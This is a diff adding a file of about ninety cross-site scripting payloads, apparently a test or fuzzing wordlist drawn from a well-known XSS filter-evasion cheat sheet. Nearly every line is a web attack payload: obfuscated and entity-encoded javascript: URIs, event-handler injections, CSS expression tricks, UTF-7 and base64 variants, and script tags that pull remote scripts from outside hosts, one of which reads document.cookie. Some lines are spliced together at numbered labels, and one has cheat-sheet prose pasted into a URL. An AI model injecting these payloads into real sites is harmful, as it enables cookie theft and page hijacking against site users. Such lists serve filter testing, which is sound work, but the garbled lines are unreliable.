@@ -1,0 +1,90 @@
+<IMG SRC="javascript:alert(1);">
+<IMG SRC=javascript:alert(1)>
+<IMG SRC=JaVaScRiPt:alert(1)>
+<IMG SRC=javascript:alert("XSS")>
+<IMG SRC=`javascript:alert("RSnake says, 1")`>xss_payload_2.1<IMG SRC=`javascript:alert("RSnake says, 1")`>
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=# onmouseover="alert(1)">
+<IMG SRC= onmouseover="alert(1)">xss_payload_3<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>xss_payload_4<IMG SRC="jav	ascript:alert(1);">
+<IMG SRC="jav&#x09;ascript:alert(1);">
+<IMG SRC="jav&#x0A;ascript:alert(1);">
+<IMG SRC="jav&#x0D;ascript:alert(1);">
+<IMG SRC=" &#14;  javascript:alert(1);">
+<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>xss_payload_5.1<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://xss.rocks/xss.js?< B >
+<SCRIPT SRC=//xss.rocks/.j>xss_payload_6.1<IMG SRC="javascript:alert(1)"
+<iframe src=http://xxxxxx/scriptlet.html>
+<iframe src=http://xxxxxx/scriptlet.html <
+\";alert(1);//
+</script><script>alert(1);</script>
+</TITLE><SCRIPT>alert("XSS");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1);">
+<BODY BACKGROUND="javascript:alert(1)">
+<IMG DYNSRC="javascript:alert(1)">
+<IMG LOWSRC="javascript:alert(1)">
+<STYLE>li {list-style-image: url("javascript:alert(1)");}</STYLE><UL><LI>XSS</br>xss_payload_7.1<IMG SRC=vbscript:msgbox(1)>
+<IMG SRC="livescript:[code]">
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+Set.constructor`alert\x28document.domain\x29```
+<BODY ONLOAD=alert(1)>
+<BGSOUND SRC="javascript:alert(1);">
+<BR SIZE="&{alert(1)}">
+<LINK REL="stylesheet" HREF="javascript:alert(1);">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">xss_payload_8.1<STYLE>@import'http://xxxxxxxxx/xss.css';</STYLE>
+<META HTTP-EQUIV="Link" Content="<http://xxxxxxxxx/xss.css>; REL=stylesheet">
+<STYLE>BODY{-moz-binding:url("http://xxxxxxxxx/xssmoz.xml#xss")}</STYLE>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<STYLE TYPE="text/javascript">alert(1);</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert(1)");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert(1)")}</STYLE>
+<XSS STYLE="xss:expression(alert(1))">
+<XSS STYLE="behavior: url(xss.htc);">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1);">xss_payload_9.1<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(1);">
+<IFRAME SRC="javascript:alert(1);"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>
+<TABLE BACKGROUND="javascript:alert(1)">
+<TABLE><TD BACKGROUND="javascript:alert(1)">
+<DIV STYLE="background-image: url(javascript:alert(1))">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert(1))">xss_payload_10.1<DIV STYLE="width: expression(alert(1));">
+<!--[if gte IE 4]><SCRIPT>alert(1);</SCRIPT><![endif]-->
+<BASE HREF="javascript:alert(1);//">
+<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
+EMBED SRC="http://ha.ckers.Using an EMBED tag you can embed a Flash movie that contains XSS. Click here for a demo. If you add the attributes allowScriptAccess="never" and allownetworking="internal" it can mitigate this risk (thank you to Jonathan Vanasco for the info).:org/xss.swf" AllowScriptAccess="always"></EMBED>
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert(1)"></B></I></XML>
+<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
+<XML SRC="xsstest.xml" ID=I></XML>
+<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>xss_payload_11.1<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>
+<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
+<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-
+<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>xss_payload_12.1<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
+<A HREF="http://66.102.7.147/">XSS</A>
+<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
+<A HREF="http://1113982867/">XSS</A>
+<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
+<A HREF="http://0102.0146.0007.00000223/">XSS</A>
+<A HREF="h tt	p://6	6.000146.0x7.147/">XSS</A>
+<A HREF="//www.google.com/">XSS</A>
+<A HREF="//google">XSS</A>
+<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://google.com/">XSS</A>
+<A HREF="http://www.google.com./">XSS</A>
+<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
+<A HREF="http://www.google.com/ogle.com/">XSS</A>
